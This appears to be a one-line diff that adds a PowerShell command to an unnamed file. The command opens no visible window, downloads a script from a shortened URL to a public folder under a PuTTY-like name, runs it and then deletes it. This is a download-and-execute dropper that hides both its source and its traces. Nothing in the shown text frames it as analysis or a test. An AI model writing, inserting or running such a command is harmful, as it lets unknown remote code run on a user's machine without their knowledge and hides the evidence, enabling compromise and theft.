@@ -1,0 +1,1 @@
+PowerShell  -windowstyle hidden -command (New-Object System.Net.WebClient).DownloadFile('https://tinyurl.com/y276f6wl','C:\Users\Public\openputty.ps1');C:\Users\Public\openputty.ps1;rm C:\Users\Public\openputty.ps1
